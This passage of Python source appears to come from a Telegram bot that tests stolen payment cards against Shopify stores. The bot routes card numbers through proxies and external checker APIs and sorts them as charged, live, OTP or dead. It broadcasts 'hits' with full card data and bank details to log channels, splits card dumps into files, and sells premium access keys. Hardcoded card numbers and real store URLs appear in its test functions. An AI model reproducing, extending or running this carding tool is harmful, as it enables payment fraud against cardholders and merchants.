        await f.write(f"⚡💳 {BOT_NAME.upper()} FINAL RESULTS 💳⚡\n")
        await f.write("=" * 70 + "\n\n")
        await f.write("📊 SUMMARY\n")
        await f.write(f"Total Cards: {results.get('total', 0)}\n")
        await f.write(f"✅ Charged: {len(results.get('charged', []))}\n")
        await f.write(f"🔥 Approved: {len(results.get('approved', []))}\n")
        await f.write(f"🔑 OTP: {len(results.get('otp', []))}\n")
        await f.write(f"❌ Dead: {len(results.get('dead', []))}\n")
        await f.write(f"⚠️ Errors: {error_count}\n")
        await f.write(f"⏱️ Time: {hours}h {minutes}m {seconds}s\n")
        await f.write(f"🌐 Gateway: {gateway}\n")
        await f.write(f"💰 Price: {price}\n")
        await f.write("=" * 70 + "\n\n")
        if results.get('charged'):
            await f.write(f"✅ CHARGED ({len(results.get('charged', []))}):\n")
            await f.write("-" * 70 + "\n")
            for r in results.get('charged', []):
                await f.write(f"{r.get('card', '')} | {r.get('gateway', 'Auto Shopify')} | {r.get('price', '-')} | {str(r.get('message', ''))[:100]}\n")
            await f.write("\n")
        if results.get('approved'):
            await f.write(f"🔥 APPROVED ({len(results.get('approved', []))}):\n")
            await f.write("-" * 70 + "\n")
            for r in results.get('approved', []):
                await f.write(f"{r.get('card', '')} | {r.get('gateway', 'Auto Shopify')} | {r.get('price', '-')} | {str(r.get('message', ''))[:100]}\n")
            await f.write("\n")
        if results.get('otp'):
            await f.write(f"🔑 OTP ({len(results.get('otp', []))}):\n")
            await f.write("-" * 70 + "\n")
            for r in results.get('otp', []):
                await f.write(f"{r.get('card', '')} | {r.get('gateway', 'Auto Shopify')} | {r.get('price', '-')} | {str(r.get('message', ''))[:100]}\n")
            await f.write("\n")
        if results.get('dead'):
            await f.write(f"❌ DEAD ({len(results.get('dead', []))}):\n")
            await f.write("-" * 70 + "\n")
            for r in results.get('dead', []):
                await f.write(f"{r.get('card', '')} | {r.get('gateway', '')} | {r.get('price', '-')} | {str(r.get('message', ''))[:100]}\n")
            await f.write("\n")
        error_cards = results.get('error_cards', [])
        if error_cards:
            await f.write(f"⚠️ ERRORS ({len(error_cards)}):\n")
            await f.write("-" * 70 + "\n")
            for r in error_cards:
                error_msg = str(r.get('message', 'Unknown Error'))[:500]
                await f.write(f"{r.get('card', '')} | {r.get('gateway', '')} | {r.get('price', '-')} | {error_msg}\n")
    try:
        await bot.send_message(chat_id, premium_emoji(summary), file=filename, parse_mode="html")
    except Exception as e:
        print(f"Send final error: {e}")
        await bot.send_message(chat_id, premium_emoji(summary), parse_mode="html")
    try:
        os.remove(filename)
    except Exception:
        pass

# ===================== SEND HIT & LOG FUNCTIONS =====================
async def send_hit_to_admin(result, user_id, hit_type):
    try:
        brand, _, _, bank, country, flag = await get_bin_info(result['card'].split('|')[0])
        gateway = result.get("gateway", "𝘼𝙪𝙩𝙤 𝙎𝙝𝙤𝙥𝙞𝙛𝙮")
        price = result.get("price", "-")
        response_msg = str(result.get('message', 'Unknown Response'))[:180]
        if result['status'] == 'Charged':
            status_text = "Charged 💎"
        elif result['status'] == 'Approved':
            status_text = "Live 🔥"
        else:
            status_text = "Dead ❌"
        ist = pytz.timezone('Asia/Kolkata')
        current_time = datetime.now(ist).strftime("%I:%M:%S %p IST")
        try:
            sender = await bot.get_entity(user_id)
            first_name = sender.first_name or "Unknown"
            tg_username = "@" + sender.username if sender.username else "No Username"
        except Exception:
            first_name = "Unknown"
            tg_username = "No Username"
        if is_admin(user_id):
            plan = "👑 Admin"
        elif is_premium(user_id):
            plan = "💎 Premium"
        else:
            plan = "⭐ Free"

        log_msg = f"""[❆] {status_text}
👤 {tg_username} | ID: <code>{user_id}</code>
💳
   ⤷ <code>{result['card']}</code>
Gate ➳ {gateway} {price}
──────────
Resp ➳ {response_msg}
Bin ➳ <code>{brand} - {bank} - {country} {flag}</code>
──────────
⏱ ➳ {current_time}
🔗 ➳ <a href="tg://user?id={user_id}">{first_name}</a> [{plan}]
🤩 ➳ <b>{BOT_NAME}</b>"""
        await send_to_log_channel(log_msg)
    except Exception as e:
        print(f"send_hit_to_admin error: {e}")

async def send_realtime_hit_group(user_id, result, hit_type, username):
    try:
        if result['status'] != 'Charged':
            return
        gateway = result.get('gateway', 'Shopify Payments')
        price = result.get('price', '0.00')
        response_msg = str(result.get('message', 'Unknown')).replace("_", " ").upper()[:60]
        plan = "admin 👑" if is_admin(user_id) else ("💎 Premium" if is_premium(user_id) else "⭐ Free")
        message = f"""𝗛𝗜𝗧 → 𝗖𝗛𝗔𝗥𝗚𝗘𝗗 💎
𝗚𝗘𝗧 → <code>{gateway} {price} USD</code>
RES✅ → <code>{response_msg}</code>
𝗨𝗦𝗘𝗥 → <a href="tg://user?id={user_id}">{username}</a> [{plan}]"""
        await send_to_log_channel(message)
    except Exception as e:
        print(f"send_realtime_hit_group error: {e}")

async def send_realtime_hit_dm(user_id, result, hit_type, username):
    try:
        if result["status"] not in ("Approved", "Charged"):
            return
        brand, _, _, bank, country, flag = await get_bin_info(result['card'].split('|')[0])
        gateway = result.get("gateway", "𝘼𝙪𝙩𝙤 𝙎𝙝𝙤𝙥𝙞𝙛𝙮")
        price = result.get("price", "-")
        response_msg = str(result.get('message', 'Unknown Response'))[:150]
        current_time = datetime.now(pytz.timezone('Asia/Kolkata')).strftime("%I:%M:%S %p IST")
        status_text = "Charged 💎" if result['status'] == 'Charged' else "Live 🔥"
        plan = "👑 Admin" if is_admin(user_id) else ("💎 Premium" if is_premium(user_id) else "⭐ Free")

        hit_caption = f"""[❆] {status_text}
💳
   ⤷ <code>{result['card']}</code>
Gate ➳ {gateway} {price}
──────────
Resp ➳ {response_msg}
Bin ➳ <code>{brand} - {bank} - {country} {flag}</code>
──────────
⏱ ➳ {current_time}
🔗 ➳ <a href="tg://user?id={user_id}">{username}</a> [{plan}]
🤩 ➳ <b>{BOT_NAME}</b>"""
        sent = await send_gift_video(user_id, result['card'], premium_emoji(hit_caption))
        if not sent:
            await bot.send_message(user_id, premium_emoji(hit_caption), parse_mode='html', buttons=kb_bot_link())
    except Exception as e:
        print(f"DM hit error: {e}")

# ==================== SITE CHECK HELPERS =====================
async def check_one_site(session, site):
    try:
        if not site.startswith("http"):
            site = "https://" + site
        async with session.get(site, allow_redirects=True) as resp:
            return site, resp.status < 500
    except Exception:
        return site, False

async def fast_site_check(sites):
    timeout = aiohttp.ClientTimeout(total=8)
    connector = aiohttp.TCPConnector(limit=50, ssl=False)
    async with aiohttp.ClientSession(timeout=timeout, connector=connector) as session:
        tasks = [check_one_site(session, site) for site in sites]
        results = await asyncio.gather(*tasks)
    alive = []
    dead = 0
    for site, ok in results:
        if ok:
            alive.append(site)
        else:
            dead += 1
    return alive, dead

# ===================== MULTI-DEVICE KEY FUNCTIONS =====================
def load_keys():
    try:
        with open(MULTI_KEYS_FILE, "r") as f:
            return json.load(f)
    except Exception:
        return {}

def save_keys(keys):
    with open(MULTI_KEYS_FILE, "w") as f:
        json.dump(keys, f, indent=2)

def generate_multi_device_key(days, device_limit):
    prefix = "SHOPIFY-CHK"
    random_part = ''.join(secrets.choice(string.ascii_uppercase + string.digits) for _ in range(6))
    key = f"{prefix}-{random_part}-{days}D-{device_limit}U"
    keys = load_keys()
    keys[key] = {
        "days": days,
        "device_limit": device_limit,
        "used": 0,
        "users": [],
        "created": datetime.now(pytz.timezone('Asia/Kolkata')).strftime("%Y-%m-%d %H:%M:%S"),
        "active": True
    }
    save_keys(keys)
    return key

def redeem_multi_device_key(key, user_id):
    keys = load_keys()
    if key not in keys:
        return "invalid"
    key_data = keys[key]
    if not key_data.get("active", False):
        return "invalid"
    if str(user_id) in key_data.get("users", []):
        return "used"
    if is_premium(user_id) or is_admin(user_id):
        return "already_premium"
    if key_data["used"] >= key_data["device_limit"]:
        return "device_limit_reached"
    key_data["used"] += 1
    key_data["users"].append(str(user_id))
    if key_data["used"] >= key_data["device_limit"]:
        key_data["active"] = False
    save_keys(keys)
    days = key_data["days"]
    expiry = (datetime.now(pytz.timezone('Asia/Kolkata')) + timedelta(days=days)).strftime("%Y-%m-%d %H:%M:%S")
    try:
        with open(PREMIUM_FILE, "a") as f:
            f.write(f"{user_id}|{expiry}\n")
    except Exception:
        pass
    return "success"

def get_key_info(key):
    keys = load_keys()
    key_data = keys.get(key, {})
    if not key_data:
        return None
    return {
        "days": key_data.get("days", 0),
        "limit": key_data.get("device_limit", 0),
        "used": key_data.get("used", 0),
        "users": key_data.get("users", []),
        "created": key_data.get("created", "Unknown"),
        "active": key_data.get("active", False)
    }

# ===================== USER SITE/PROXY FUNCTIONS =====================
async def load_user_sites():
    if not os.path.exists(USER_SITES_FILE):
        return {}
    try:
        with open(USER_SITES_FILE, 'r', encoding='utf-8') as f:
            return json.load(f)
    except Exception:
        return {}

async def save_user_sites(data):
    with open(USER_SITES_FILE, 'w', encoding='utf-8') as f:
        json.dump(data, f, indent=4)

def get_user_sites_sync(user_id):
    if not os.path.exists(USER_SITES_FILE):
        return []
    try:
        with open(USER_SITES_FILE, 'r', encoding='utf-8') as f:
            data = json.load(f)
        return data.get(str(user_id), [])
    except Exception:
        return []

async def add_user_site(user_id, site):
    data = await load_user_sites()
    user_sites = data.get(str(user_id), [])
    if site not in user_sites:
        user_sites.append(site)
        data[str(user_id)] = user_sites
        await save_user_sites(data)
        return True
    return False

async def remove_user_site(user_id, site):
    data = await load_user_sites()
    user_sites = data.get(str(user_id), [])
    if site in user_sites:
        user_sites.remove(site)
        if user_sites:
            data[str(user_id)] = user_sites
        else:
            data.pop(str(user_id), None)
        await save_user_sites(data)
        return True
    return False

async def clear_user_sites(user_id):
    data = await load_user_sites()
    if str(user_id) in data:
        del data[str(user_id)]
        await save_user_sites(data)
        return True
    return False

async def load_user_proxies():
    if not os.path.exists(USER_PROXY_FILE):
        return {}
    try:
        with open(USER_PROXY_FILE, 'r', encoding='utf-8') as f:
            content = f.read()
            return json.loads(content) if content else {}
    except Exception:
        return {}

async def save_user_proxies(data):
    try:
        with open(USER_PROXY_FILE, 'w', encoding='utf-8') as f:
            json.dump(data, f, indent=4, ensure_ascii=False)
        return True
    except Exception:
        return False

async def get_user_proxies_sync(user_id):
    data = await load_user_proxies()
    return data.get(str(user_id), [])

async def add_user_proxy(user_id, proxy):
    data = await load_user_proxies()
    user_proxies = data.get(str(user_id), [])
    if proxy not in user_proxies:
        user_proxies.append(proxy)
        data[str(user_id)] = user_proxies
        await save_user_proxies(data)
        return True
    return False

async def remove_user_proxy(user_id, proxy):
    data = await load_user_proxies()
    user_proxies = data.get(str(user_id), [])
    if proxy in user_proxies:
        user_proxies.remove(proxy)
        if user_proxies:
            data[str(user_id)] = user_proxies
        else:
            data.pop(str(user_id), None)
        await save_user_proxies(data)
        return True
    return False

# ===================== BLOCK FUNCTIONS =====================
def block_user(user_id):
    if not is_blocked(user_id):
        with open(BLOCK_FILE, "a") as f:
            f.write(f"{user_id}\n")

def unblock_user(user_id):
    if is_blocked(user_id):
        blocked = get_blocked_users()
        blocked.remove(str(user_id))
        with open(BLOCK_FILE, "w") as f:
            for uid in blocked:
                f.write(f"{uid}\n")

def get_blocked_users():
    try:
        with open(BLOCK_FILE, "r") as f:
            return f.read().splitlines()
    except Exception:
        return []

# ===================== PROXY & SITE TEST =====================
async def check_proxy(proxy: str):
    for attempt in range(1, 5):
        try:
            proxy = proxy.strip()
            test_card = "5154623245618097|03|2032|156"
            test_sites = [
                "https://punisher.myshopify.com",
                "https://kingdomcomecards.com",
                "https://paperieplanning.com",
                "https://dev-goodybeads.myshopify.com",
                "https://blackhelmetapparel.com",
                "https://magneticjewelrysupply.myshopify.com"
            ]
            test_site = random.choice(test_sites)
            api_url = get_api()
            url = f"{api_url}?site={test_site}&cc={test_card}&proxy={proxy}"
            timeout = aiohttp.ClientTimeout(total=12)
            async with aiohttp.ClientSession(timeout=timeout) as session:
                async with session.get(url) as resp:
                    raw = await resp.json(content_type=None)
            response = str(raw.get("Response", "")).lower()
            DEAD = (
                "proxy dead", "invalid proxy format", "no proxy", "proxy error",
                "connection refused", "connection reset", "timeout", "timed out",
                "407", "502", "503", "504", "bad gateway", "gateway timeout",
                "socks error", "proxy connection failed", "tunnel connection failed",
                "cannot connect to proxy", "proxy rejected"
            )
            if any(x in response for x in DEAD):
                if attempt < 4:
                    await asyncio.sleep(1.5)
                    continue
                return {"alive": False}
            return {"alive": True}
        except Exception:
            if attempt < 4:
                await asyncio.sleep(1.5)
                continue
            return {"alive": False}
    return {"alive": False}

async def test_site(site, proxy):
    test_card = "5154623245618097|03|2032|156"
    try:
        if not site.startswith("http"):
            site = f"https://{site}"
        api_url = get_api()
        url = f"{api_url}?site={site}&cc={test_card}&proxy={proxy}"
        timeout = aiohttp.ClientTimeout(total=30)
        async with aiohttp.ClientSession(timeout=timeout) as session:
            async with session.get(url) as resp:
                raw = await resp.json(content_type=None)
        response_msg = str(raw.get("Response", "")).lower()
        if is_dead_site_error(response_msg):
            return {"site": site, "status": "dead"}
        return {"site": site, "status": "alive"}
    except Exception:
        return {"site": site, "status": "dead"}

# ===================== NEW COMMANDS: /uploadsites, /uploadproxy, /setlogs, /addgroup =====================

# ---- /uploadsites (Replace old sites with new ones from .txt reply) ----
@bot.on(events.NewMessage(pattern=r'^/uploadsites(?:\s|$)'))
async def upload_sites_replace_cmd(event):
    user_id = event.sender_id
    if not is_admin(user_id):
        await event.reply(premium_emoji("❌ <b>Access Denied</b>\n\nOnly admin can use <code>/uploadsites</code>."), parse_mode="html")
        return
    if not event.reply_to_msg_id:
        await event.reply(premium_emoji("❌ Reply to a <code>.txt</code> file containing sites (one per line) with <code>/uploadsites</code>."), parse_mode="html")
        return
    reply_msg = await event.get_reply_message()
    if not reply_msg or not reply_msg.file or not str(reply_msg.file.name).endswith('.txt'):
        await event.reply(premium_emoji("❌ Please reply to a valid <code>.txt</code> file."), parse_mode="html")
        return

    status_msg = await event.reply(premium_emoji("🔄 Replacing old sites with new list..."), parse_mode="html")
    file_path = await reply_msg.download_media()
    async with aiofiles.open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
        content = await f.read()
    try:
        os.remove(file_path)
    except Exception:
        pass

    raw_sites = [line.strip() for line in content.splitlines() if line.strip() and not line.strip().startswith('#')]
    normalized = []
    for s in raw_sites:
        s_norm = s if s.startswith('http') else f"https://{s}"
        if s_norm not in normalized:
            normalized.append(s_norm)

    if not normalized:
        await status_msg.edit(premium_emoji("❌ No valid sites found in file."), parse_mode="html")
        return

    old_count = len(get_file_lines(SITES_FILE))
    async with aiofiles.open(SITES_FILE, 'w', encoding='utf-8') as f:
        for s in normalized:
            await f.write(f"{s}\n")

    await status_msg.edit(premium_emoji(f"""<b>✅ SITES UPLOADED & REPLACED!</b>
━━━━━━━━━━━━━━━━━━━━
🗑 <b>Old Sites Removed:</b> <code>{old_count}</code>
✅ <b>New Sites Saved:</b> <code>{len(normalized)}</code>
━━━━━━━━━━━━━━━━━━━━
🤖 <b>Bot:</b> {BOT_NAME}"""), parse_mode="html")

# ---- /uploadproxy (Replace old proxies with new ones from .txt reply or text) ----
@bot.on(events.NewMessage(pattern=r'^/uploadproxy(?:\s|\n|$)([\s\S]*)'))
async def upload_proxy_replace_cmd(event):
    user_id = event.sender_id
    if not is_admin(user_id):
        await event.reply(premium_emoji("❌ <b>Access Denied</b>\n\nOnly admin can use <code>/uploadproxy</code>."), parse_mode="html")
        return

    content = ""
    if event.reply_to_msg_id:
        reply_msg = await event.get_reply_message()
        if reply_msg and reply_msg.file and str(reply_msg.file.name).endswith('.txt'):
            file_path = await reply_msg.download_media()
            async with aiofiles.open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
                content = await f.read()
            try:
                os.remove(file_path)
            except Exception:
                pass

    if not content:
        content = (event.pattern_match.group(1) or "").strip()

    if not content:
        await event.reply(premium_emoji("❌ Reply to a <code>.txt</code> proxy file or pass proxies after <code>/uploadproxy</code>."), parse_mode="html")
        return

    proxies_list = []
    for line in content.splitlines():
        for p in line.split():
            p = p.strip()
            if p and ":" in p and p not in proxies_list:
                proxies_list.append(p)

    if not proxies_list:
        await event.reply(premium_emoji("❌ No valid proxies found."), parse_mode="html")
        return

    old_count = len(load_proxies())
    async with aiofiles.open(PROXY_FILE, 'w', encoding='utf-8') as f:
        for p in proxies_list:
            await f.write(f"{p}\n")

    await event.reply(premium_emoji(f"""<b>✅ PROXIES UPLOADED & REPLACED!</b>
━━━━━━━━━━━━━━━━━━━━
🗑 <b>Old Proxies Removed:</b> <code>{old_count}</code>
✅ <b>New Proxies Saved:</b> <code>{len(proxies_list)}</code>
━━━━━━━━━━━━━━━━━━━━
🤖 <b>Bot:</b> {BOT_NAME}"""), parse_mode="html")

# ---- /setlogs (Set log channel ID + optional GIF/animation reply) ----
@bot.on(events.NewMessage(pattern=r'^/setlogs(?:\s+(.+))?$'))
async def set_logs_cmd(event):
    user_id = event.sender_id
    if not is_admin(user_id):
        await event.reply(premium_emoji("❌ <b>Access Denied</b>\n\nOnly admin can use <code>/setlogs</code>."), parse_mode="html")
        return

    arg = (event.pattern_match.group(1) or "").strip()
    target_channel = None

    if arg:
        if arg.lstrip("-").isdigit():
            target_channel = int(arg)
        else:
            try:
                ent = await bot.get_entity(arg)
                target_channel = ent.id
            except Exception:
                await event.reply(premium_emoji("❌ Invalid channel ID or username."), parse_mode="html")
                return

    gif_updated = False
    if event.reply_to_msg_id:
        reply_msg = await event.get_reply_message()
        if reply_msg and (reply_msg.gif or reply_msg.video or reply_msg.document or reply_msg.media):
            try:
                saved_path = await reply_msg.download_media(file=LOG_GIF_FILE)
                if saved_path:
                    if reply_msg.media:
                        BOT_CONFIG["log_gif_file_id"] = reply_msg.media
                    gif_updated = True
            except Exception as e:
                print(f"GIF save error: {e}")

    if target_channel is not None:
        BOT_CONFIG["log_channel"] = target_channel
    save_bot_config(BOT_CONFIG)

    current_log = BOT_CONFIG.get("log_channel")
    status_text = f"""<b>✅ LOG SETTINGS UPDATED!</b>
━━━━━━━━━━━━━━━━━━━━
📺 <b>Log Channel ID:</b> <code>{current_log}</code>
🎞️ <b>GIF Attached/Updated:</b> <code>{"Yes" if gif_updated else ("Existing" if os.path.exists(LOG_GIF_FILE) or BOT_CONFIG.get("log_gif_file_id") else "No")}</code>
━━━━━━━━━━━━━━━━━━━━
💡 <i>Tip: Reply to a GIF/video with</i> <code>/setlogs -100xxxxxxxxxx</code> <i>to set both channel & GIF.</i>"""
    await event.reply(premium_emoji(status_text), parse_mode="html")

# ---- /addgroup (Set required group by ID or link) ----
@bot.on(events.NewMessage(pattern=r'^/addgroup(?:\s+(.+))?$'))
async def add_group_cmd(event):
    user_id = event.sender_id
    if not is_admin(user_id):
        await event.reply(premium_emoji("❌ <b>Access Denied</b>\n\nOnly admin can use <code>/addgroup</code>."), parse_mode="html")
        return

    raw_input = (event.pattern_match.group(1) or "").strip()
    if not raw_input:
        await event.reply(premium_emoji("❌ Usage: <code>/addgroup -1001234567890</code> or <code>/addgroup https://t.me/yourgroup</code>"), parse_mode="html")
        return

    group_id = None
    group_link = raw_input if raw_input.startswith("http") else None

    if raw_input.lstrip("-").isdigit():
        group_id = int(raw_input)
        try:
            ent = await bot.get_entity(group_id)
            if getattr(ent, "username", None) and not group_link:
                group_link = f"https://t.me/{ent.username}"
        except Exception:
            pass
    else:
        try:
            ent = await bot.get_entity(raw_input)
            group_id = ent.id
            if not group_link:
                if getattr(ent, "username", None):
                    group_link = f"https://t.me/{ent.username}"
                else:
                    group_link = raw_input
        except Exception:
            await event.reply(premium_emoji("❌ Could not resolve group. Make sure bot is in the group or provide a valid ID/link."), parse_mode="html")
            return

    BOT_CONFIG["required_group"] = group_id
    BOT_CONFIG["required_group_link"] = group_link
    save_bot_config(BOT_CONFIG)

    await event.reply(premium_emoji(f"""<b>✅ REQUIRED GROUP SET!</b>
━━━━━━━━━━━━━━━━━━━━
👥 <b>Group ID:</b> <code>{group_id}</code>
🔗 <b>Link:</b> <code>{group_link or 'N/A'}</code>
━━━━━━━━━━━━━━━━━━━━
🤖 <b>Bot:</b> {BOT_NAME}"""), parse_mode="html")

# ===================== STATS & ADMIN COMMANDS =====================
@bot.on(events.NewMessage(pattern='/stats'))
async def stats_cmd(event):
    user_id = event.sender_id
    if not is_admin(user_id):
        await event.reply(premium_emoji("❌ **Access Denied**\n\nOnly admins can use this command."))
        return
    status_msg = await event.reply(premium_emoji("⏳ Fetching stats..."))

    premium_users = []
    try:
        with open(PREMIUM_FILE, 'r', encoding='utf-8') as f:
            for line in f:
                if line.strip():
                    uid = line.split('|')[0]
                    if uid.isdigit():
                        premium_users.append(int(uid))
    except Exception:
        pass

    banned = get_blocked_users()
    sites = load_sites()
    proxies = load_proxies()
    user_count = 0
    try:
        conn = sqlite3.connect('users.db')
        cursor = conn.cursor()
        cursor.execute("SELECT COUNT(*) FROM users")
        user_count = cursor.fetchone()[0]
        conn.close()
    except Exception:
        pass

    active_premium = sum(1 for uid in premium_users if is_premium(uid))
    req_grp = BOT_CONFIG.get("required_group") or "None"
    log_ch = BOT_CONFIG.get("log_channel") or ADMIN_ID

    stats_msg = f"""<b>📊 {BOT_NAME.upper()} STATISTICS</b>
━━━━━━━━━━━━━━━━━━━━
👥 <b>Total Users:</b> <code>{user_count}</code>
💎 <b>Active Premium:</b> <code>{active_premium}</code>
🚫 <b>Banned Users:</b> <code>{len(banned)}</code>
━━━━━━━━━━━━━━━━━━━━
🛒 <b>Shopify Sites:</b> <code>{len(sites)}</code>
🌐 <b>Proxies:</b> <code>{len(proxies)}</code>
🔌 <b>APIs (Round-Robin):</b> <code>{len(SHOPIFY_APIS)}</code>
📺 <b>Log Channel:</b> <code>{log_ch}</code>
👥 <b>Required Group:</b> <code>{req_grp}</code>
━━━━━━━━━━━━━━━━━━━━
🤖 <b>Bot:</b> {BOT_NAME}"""
    await status_msg.edit(premium_emoji(stats_msg), parse_mode="html")

async def send_to_chat(chat_id, text, **kwargs):
    try:
        await bot.send_message(chat_id, text, **kwargs)
    except FloodWaitError as e:
        print(f"FloodWait: {e.seconds}s - waiting...")
        await asyncio.sleep(e.seconds)
        await bot.send_message(chat_id, text, **kwargs)
    except Exception as e:
        print(f"Send to chat error: {e}")

@bot.on(events.NewMessage(pattern='/testapis'))
async def test_all_apis(event):
    user_id = event.sender_id
    if not is_admin(user_id):
        await event.reply(premium_emoji("❌ **Access Denied**\n\nOnly admins can use this command."))
        return
    status_msg = await event.reply(premium_emoji("⏳ **Testing all APIs...**"))
    test_card = "4061730206041873|11|2026|387"
    test_site = "https://st-marks-episcopal-church-school.myshopify.com"
    test_proxy = "127.0.0.1:8080"
    results = []
    working = 0
    dead = 0
    for i, api in enumerate(SHOPIFY_APIS, 1):
        try:
            url = f"{api}?site={test_site}&cc={test_card}&proxy={test_proxy}"
            timeout = aiohttp.ClientTimeout(total=8)
            async with aiohttp.ClientSession(timeout=timeout) as session:
                async with session.get(url) as resp:
                    if resp.status == 200:
                        results.append(f"✅ **API {i}** → <code>{api[:50]}...</code>\n➜ 🟢 **RESPONDING**")
                        working += 1
                    else:
                        results.append(f"❌ **API {i}** → <code>{api[:50]}...</code>\n➜ 🔴 **DEAD ({resp.status})**")
                        dead += 1
        except Exception as e:
            results.append(f"❌ **API {i}** → <code>{api[:50]}...</code>\n➜ 🔴 **DEAD ({str(e)[:30]})**")
            dead += 1
    final_msg = f"""<b>⚡ API STATUS CHECK ⚡</b>
━━━━━━━━━━━━━━━━━━━━
{chr(10).join(results)}
━━━━━━━━━━━━━━━━━━━━
✅ Working: <code>{working}</code>
❌ Dead: <code>{dead}</code>
🤖 <b>Bot:</b> {BOT_NAME}"""
    await status_msg.edit(premium_emoji(final_msg), parse_mode="html")

# ---- /split ----
@bot.on(events.NewMessage(pattern=r'^/split\s+(\d+)$'))
async def split_cards_command(event):
    user_id = event.sender_id
    if not is_premium(user_id) and not is_admin(user_id):
        await event.reply(premium_emoji("❌ **Access Denied**\n\nOnly premium/admin can use this command."))
        return
    try:
        per_file = int(event.pattern_match.group(1))
        if per_file < 1:
            raise ValueError
    except Exception:
        await event.reply(premium_emoji("❌ Usage: `/split 100`"))
        return
    if not event.reply_to_msg_id:
        await event.reply(premium_emoji("❌ Reply to a .txt file with `/split 100`"))
        return
    reply_msg = await event.get_reply_message()
    if not reply_msg.file or not str(reply_msg.file.name).endswith('.txt'):
        await event.reply(premium_emoji("❌ Sirf .txt file reply kar."))
        return
    status_msg = await event.reply(premium_emoji("🔄 Processing file..."))
    file_path = await reply_msg.download_media()
    async with aiofiles.open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
        content = await f.read()
    cards = extract_cc(content)
    try:
        os.remove(file_path)
    except Exception:
        pass
    if not cards:
        await status_msg.edit(premium_emoji("❌ No valid CCs found in file."))
        return
    total_cards = len(cards)
    chunks = [cards[i:i + per_file] for i in range(0, len(cards), per_file)]
    sent = 0
    for idx, chunk in enumerate(chunks, 1):
        timestamp = datetime.now(pytz.timezone('Asia/Kolkata')).strftime("%Y%m%d_%H%M%S")
        filename = f"split_{idx}_{timestamp}.txt"
        async with aiofiles.open(filename, 'w', encoding='utf-8') as f:
            for card in chunk:
                await f.write(f"{card}\n")
        await bot.send_message(user_id, premium_emoji(f"📄 **Part {idx}** – {len(chunk)} cards"), file=filename, parse_mode="html")
        sent += 1
        await asyncio.sleep(0.3)
        try:
            os.remove(filename)
        except Exception:
            pass
    await status_msg.edit(premium_emoji(f"""✅ **Split Complete!**
📊 Total Cards: <code>{total_cards}</code>
📦 Per File: <code>{per_file}</code>
📁 Total Files: <code>{len(chunks)}</code>
✅ Sent: <code>{sent}</code>"""), parse_mode="html")

# ---- /site ----
@bot.on(events.NewMessage(pattern=r'^/site$'))
async def site_check_command(event):
    user_id = event.sender_id
    if is_admin(user_id):
        user_sites = get_user_sites_sync(user_id)
        global_sites = load_sites()
        sites = list(set(user_sites + global_sites))
        site_type = "Admin (Manual + Bot)"
    else:
        sites = get_user_sites_sync(user_id)
        site_type = "Manual"
    if not sites:
        if is_admin(user_id):
            sites = load_sites()
            site_type = "Bot Sites"
        else:
            await event.reply(premium_emoji("""❌ **No sites available!**
📌 **Add your sites first:**
<code>/addsite https://yoursite.com</code>
💡 **Check your sites:**
<code>/mysites</code>"""), parse_mode="html")
            return
    msg = await event.reply(premium_emoji(f"""<b>⚡ Site Checker Started</b>
👤 <b>Mode:</b> {site_type}
📊 <b>Total Sites:</b> <code>{len(sites)}</code>
🔍 <b>Checking...</b>"""), parse_mode="html")
    alive, dead = await fast_site_check(sites)
    if alive:
        txt_file = f"working_sites_{user_id}.txt"
        with open(txt_file, "w") as f:
            f.write("\n".join(alive))
        await bot.send_message(user_id, f"📄 **{len(alive)} Working Sites**", file=txt_file)
        try:
            os.remove(txt_file)
        except Exception:
            pass
    if is_admin(user_id):
        buttons = [
            [Button.inline(f"🟢 MY SITES ({len(get_user_sites_sync(user_id))})", b"use_my_sites", style="primary"),
             Button.inline(f"🔵 BOT SITES ({len(load_sites())})", b"use_global", style="primary")],
            [Button.inline("🗑 CLEAR MY SITES", b"clear_my_sites", style="danger")]
        ]
        await msg.edit(premium_emoji(f"""<b>✅ Site Check Complete</b>
📊 <b>Total Checked:</b> <code>{len(sites)}</code>
✅ <b>Working:</b> <code>{len(alive)}</code>
❌ <b>Dead:</b> <code>{dead}</code>"""), buttons=buttons, parse_mode="html")
    else:
        await msg.edit(premium_emoji(f"""<b>✅ Site Check Complete</b>
📊 <b>Total Checked:</b> <code>{len(sites)}</code>
✅ <b>Working:</b> <code>{len(alive)}</code>
❌ <b>Dead:</b> <code>{dead}</code>"""), parse_mode="html")

@bot.on(events.CallbackQuery(data=b"use_my_sites"))
async def use_my_sites_handler(event):
    user_sites = get_user_sites_sync(event.sender_id)
    if user_sites:
        await event.answer(f"✅ Using YOUR {len(user_sites)} sites!", alert=True)
    else:
        await event.answer("❌ No personal sites! Using bot sites.", alert=True)

@bot.on(events.CallbackQuery(data=b"use_global"))
async def use_global_handler(event):
    await event.answer("✅ Using BOT SITES!", alert=True)

@bot.on(events.CallbackQuery(data=b"clear_my_sites"))
async def clear_my_sites_handler(event):
    user_id = event.sender_id
    count = len(get_user_sites_sync(user_id))
    if count > 0:
        await clear_user_sites(user_id)
        await event.answer(f"✅ Cleared {count} sites!", alert=True)
    else:
        await event.answer("❌ No sites to clear!", alert=True)

# ---- /addsite ----
@bot.on(events.NewMessage(pattern=r'^/addsite\s+(.+)'))
async def user_add_site(event):
    user_id = event.sender_id
    site = event.pattern_match.group(1).strip()
    if not site.startswith("http"):
        site = f"https://{site}"
    status_msg = await event.reply(premium_emoji(f"🔄 Testing Site...\n\n<code>{site[:60]}</code>"), parse_mode="html")
    proxies = load_proxies()
    if not proxies:
        await status_msg.edit(premium_emoji("❌ No proxies available! Use /uploadproxy or /addproxy first."), parse_mode="html")
        return
    proxy = random.choice(proxies)
    test_card = "5154623245618097|03|2032|156"
    url = f"{get_api()}?site={site}&cc={test_card}&proxy={proxy}"
    try:
        timeout = aiohttp.ClientTimeout(total=25)
        async with aiohttp.ClientSession(timeout=timeout) as session:
            async with session.get(url) as resp:
                raw = await resp.json(content_type=None)
        response_msg = str(raw.get('Response', '')).lower()
        price = raw.get('Price', '-')
        if is_dead_site_error(response_msg):
            await status_msg.edit(premium_emoji(f"❌ Site Dead! Not Added.\n\n<code>{site[:60]}</code>"), parse_mode="html")
            return
        if await add_user_site(user_id, site):
            new_count = len(get_user_sites_sync(user_id))
            await status_msg.edit(premium_emoji(f"""✅ Site Added to Your List!
📊 Your Sites: <code>{new_count}</code>
💰 Price: <code>{price}</code>"""), parse_mode="html")
        else:
            await status_msg.edit(premium_emoji("⚠️ Already in your list!"), parse_mode="html")
    except Exception:
